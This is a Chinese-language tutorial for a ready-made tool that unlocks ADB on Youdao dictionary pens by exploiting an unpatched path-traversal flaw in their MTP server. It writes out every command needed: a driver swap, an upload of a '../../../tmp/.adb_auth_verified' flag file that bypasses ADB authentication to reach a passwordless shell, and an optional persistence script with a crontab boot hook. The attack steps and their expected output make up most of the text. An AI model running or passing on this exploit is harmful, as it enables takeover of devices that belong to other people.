# 使用说明

本篇教程关于怎么用 Release 里那个编译好的
`mtp_traveler.exe`，复现一键解锁 ADB 的效果。

---

## 一、适用设备

有道词典笔（Rockchip 方案）
USB VID: `2207`
PID: `0001` 或 `0011`

其他类似设备可能也适用，但没验证过。

---

## 二、准备工作

你需要三样东西：

1. **`mtp_traveler.exe`**（Release 里下载）
2. **`zadig-2.9.exe`**（驱动替换工具）
   - 官网：https://zadig.akeo.ie/
   - 或者 Release 附件里也带了一份
3. **ADB 工具包**（`adb.exe` + 两个 DLL）
   - https://developer.android.com/tools/releases/platform-tools

---

## 三、操作步骤

### 第 1 步：替换驱动（deepseek要求的，实测部分情况下无需这么做）

MTP 工具要通过 `libusb` 直接访问设备，但 Windows 默认给它装的是
WPD 驱动，`libusb` 访问不了。所以必须先换驱动。

1. **插上词典笔**（确保「此电脑」里能看到它）
2. **右键 `zadig-2.9.exe` → 以管理员身份运行**
3. 菜单栏 → **Options** → 勾选 **List All Devices**
4. 在下拉框里找到词典笔：
   - 认准 VID `2207`
   - PID 是 `0001` 或 `0011`
   - 名字可能显示成 `Youdao...` 或 `MTP`
5. **右侧驱动选 `WinUSB`**
6. 点 **Replace Driver**
7. 等 1-2 分钟，提示安装成功

**替换后词典笔会从「此电脑」里消失——这是正常的。**

> ⚠️ 每换一台新电脑，都要重做这一步。驱动是装在电脑上的。

---

### 第 2 步：确认设备能被识别

打开 **CMD**（管理员），进入工具目录：

```cmd
cd /d "D:\你的路径\LynxMTP"
mtp_traveler.exe list-devices
```

应该看到类似输出：

```
Found 1 MTP device(s):
  [0] bus=1 dev=5  vendor=0x2207 product=0x0001
```

**看到了就说明驱动换成功了。**

如果没看到，或者报错，说明驱动没换好，回到第 1 步重做。

---

### 第 3 步：查看文件夹 ID

每个设备的文件夹 ID 可能不一样，先查一下：

```cmd
mtp_traveler.exe list-storage
```

输出大概是：

```
Storage volumes:
  id=3   desc=MTP   free=... / ...
```

记住这个 `id=3`（storage ID）。

然后列出根目录：

```cmd
mtp_traveler.exe list-folder 3 0
```

输出大概是：

```
DIR  id=1    parent=0  size=0   Music
DIR  id=274  parent=0  size=0   Favorite
```

记住这两个文件夹 ID：**`1`（Music）和 `274`（Favorite）**。

> **为什么不用 0？** 因为这台设备的 MTP 实现不接受 `parent_id=0`
> 作为写入目标（虽然能用来枚举）。必须用一个真实存在的文件夹 ID。

---

### 第 4 步：一键解锁

**方式 A：手动命令**

```cmd
mtp_traveler.exe put empty.txt 1 "../../../tmp/.adb_auth_verified"
```

**方式 B：用交互式菜单**

双击 `run.bat`，选「上传文件」，按提示填：

- 本地文件：`empty.txt`
- Parent ID：`1`
- 目标路径：`../../../tmp/.adb_auth_verified`

**成功的话会输出：**

```
Uploading:
  source       : empty.txt (0 bytes)
  storage_id   : 3
  parent_id    : 0x00000001 (1)
  target_path  : ../../../tmp/.adb_auth_verified

OK: file created on device.
```

**看到 `OK: file created on device.` 就成功了。**

> 如果 `parent_id=1` 失败，换成 `274` 再试一次。

---

### 第 5 步：恢复驱动（前面没换驱动的化就可以不做了）

现在词典笔在「此电脑」里看不见了，需要恢复：

1. 打开**设备管理器**（右键「开始」→ 设备管理器）
2. 找到词典笔（可能在「通用串行总线设备」下）
3. 右键 → **属性** → **驱动程序** 标签
4. 点 **回滚驱动程序**
5. 拔插一次 USB

词典笔重新出现在「此电脑」里。

---

### 第 6 步：验证 ADB

```cmd
adb devices
```

应该看到：

```
List of devices attached
xxxxxxxx    device
```

**如果是 `device` 而不是 `unauthorized`，说明解锁成功。**

然后：

```cmd
adb shell
```

**如果直接进去了，不需要密码，全程成功。**

---

## 四、原理简述（一句话版）

词典笔的 MTP 服务端在处理文件名时**没有过滤 `../` 路径穿越**。
我们上传一个文件，文件名写成 `../../../tmp/.adb_auth_verified`，
文件就被创建到了设备 `/tmp/` 目录下。这个文件是系统判断
「ADB 已验证」的标记，存在即解锁。

`libmtp` 直发 MTP 协议包，不经过 Windows 的 WPD 驱动，
所以 `../` 能原样送到设备端。这就是为什么必须换驱动、必须用
我们自己编译的 exe，而不能用普通 MTP 工具。

---

## 五、持久化（可选）

`/tmp` 是临时目录，**重启设备后会清空**。如果想让破解长期有效：

用 ADB 连上后执行：

```cmd
adb shell "mkdir -p /userdisk/skip_re"
adb shell "echo '#!/system/bin/sh' > /userdisk/skip_re/skip_login.sh"
adb shell "echo 'touch /tmp/.adb_auth_verified' >> /userdisk/skip_re/skip_login.sh"
adb shell "chmod 777 /userdisk/skip_re/skip_login.sh"
adb shell "sh /userdisk/skip_re/skip_login.sh"
```

然后想办法把 `/userdisk/skip_re/skip_login.sh` 加到开机启动里
（不同固件方式不同，可以试：

```cmd
adb shell "echo '@reboot /userdisk/skip_re/skip_login.sh' >> /tmp/crontab_file"
```

）

**如果搞不定开机自启，就每次重启后重新跑一次第 4 步。**

---

## 六、常见问题

### Q1：`list-devices` 没输出 / 报错

- 驱动没换成功 → 重新用 Zadig 操作
- 换 USB 口试试
- 关掉所有文件资源管理器窗口

### Q2：`put` 报 `Invalid Object Handle`

- `parent_id` 写错了 → 用 `list-folder` 查真实的文件夹 ID
- 试试 `274` 而不是 `1`

### Q3：`put` 报 `Could not open device`

- 用**管理员 CMD**运行
- 驱动没换好 → 重新用 Zadig

### Q4：`adb shell` 还要密码

- 说明 `/tmp/.adb_auth_verified` 没创建成功
- 用 `adb shell "ls -la /tmp/.adb_auth_verified"` 确认文件存在
- 检查时间戳是不是刚刚

### Q5：词典笔从「此电脑」消失了

- 正常现象，驱动被换成 WinUSB 了
- 用完之后按第 5 步恢复

---

## 七、注意事项

1. **每台新电脑都要换一次驱动**——驱动装在电脑上，不在设备上
2. **只在自己的设备上用**——别拿去搞别人的笔
3. **固件更新后可能失效**——厂商修补 MTP 路径过滤后就不好使了
4. **不要公开传播**——这个漏洞目前还没被广泛修补，传开了就没了
5. **`/tmp` 是临时的**——重启就清空，重要的话做持久化

---

## 八、致谢

原理参考自公开的 MTP 协议研究资料。
工具封装了 `libmtp`，仅此而已。
感谢DeepSeek
